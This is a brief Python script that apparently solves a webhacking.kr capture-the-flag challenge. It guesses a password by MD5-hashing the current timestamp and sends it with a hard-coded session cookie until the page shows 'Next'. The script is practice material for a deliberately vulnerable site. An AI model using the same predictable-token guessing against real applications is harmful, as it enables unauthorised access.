import requests
import hashlib
import re
from time import time


cookie = {'PHPSESSID': 'd7d241ec0f5ccd5890125853249f550d'}

url = "http://webhacking.kr/challenge/bonus/bonus-6/l4.php?password="

cmp = "Next"

for i in range(0,10):
    query = url + hashlib.md5(str(int(time()))).hexdigest()
    req = requests.get(query, cookies=cookie)
    res=req.text
    tmp = re.findall(cmp, res)
    #Now we can see the link for going forward
    if tmp:
        print res
        break